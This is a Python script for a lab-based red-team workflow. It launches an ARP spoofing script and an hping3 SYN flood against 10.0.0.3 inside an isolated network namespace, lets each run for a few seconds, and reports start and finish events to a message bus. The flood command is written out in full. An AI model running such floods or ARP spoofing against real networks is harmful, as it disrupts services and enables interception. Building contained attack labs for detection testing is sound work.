#!/usr/bin/env python3
"""
Remote attack trigger for n8n red team workflow.
Usage: sudo python3 run_attack.py <attack_name>

Available attacks: arp_spoof, syn_flood
"""

import subprocess
import sys
import os
import json
import time
import importlib.util
from pathlib import Path

WORKSPACE_ROOT = Path(__file__).resolve().parents[1]
CODEX_BUS_PATH = WORKSPACE_ROOT / 'codex-platform' / 'codex_bus.py'

# Load codex_bus directly from file so this script works regardless of CWD/PYTHONPATH.
spec = importlib.util.spec_from_file_location('codex_bus', CODEX_BUS_PATH)
if spec is None or spec.loader is None:
    raise ImportError(f'Unable to load module at {CODEX_BUS_PATH}')
codex_bus = importlib.util.module_from_spec(spec)
spec.loader.exec_module(codex_bus)
CodexBus = codex_bus.CodexBus

NETLAB_DIR = str(Path(__file__).resolve().parent)

ATTACKS = {
    'arp_spoof': {
        'cmd': ['ip', 'netns', 'exec', 'ns-atk', 'python3',
                f'{NETLAB_DIR}/attacks/01-arp-spoof/attack.py'],
        'duration': 10,
    },
    'syn_flood': {
        'cmd': ['ip', 'netns', 'exec', 'ns-atk', 'hping3',
                '-S', '--flood', '-p', '80', '10.0.0.3'],
        'duration': 5,
    },
}

def main():
    if len(sys.argv) < 2 or sys.argv[1] not in ATTACKS:
        print(json.dumps({'error': f'Usage: {sys.argv[0]} <{"  |  ".join(ATTACKS.keys())}>'}))
        sys.exit(1)

    attack_name = sys.argv[1]
    attack = ATTACKS[attack_name]

    bus = CodexBus(source='netlab')
    bus.connect()

    # Announce attack start
    bus.publish_attack_event(attack_name, 'started')
    print(json.dumps({'status': 'started', 'attack': attack_name}))

    try:
        proc = subprocess.Popen(attack['cmd'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(attack['duration'])
        proc.terminate()
        proc.wait(timeout=5)
    except Exception as e:
        bus.publish_attack_event(attack_name, 'error', {'error': str(e)})
        print(json.dumps({'status': 'error', 'attack': attack_name, 'error': str(e)}))
        bus.disconnect()
        sys.exit(1)

    # Announce attack complete
    bus.publish_attack_event(attack_name, 'completed')
    print(json.dumps({'status': 'completed', 'attack': attack_name}))
    bus.disconnect()

if __name__ == '__main__':
    main()
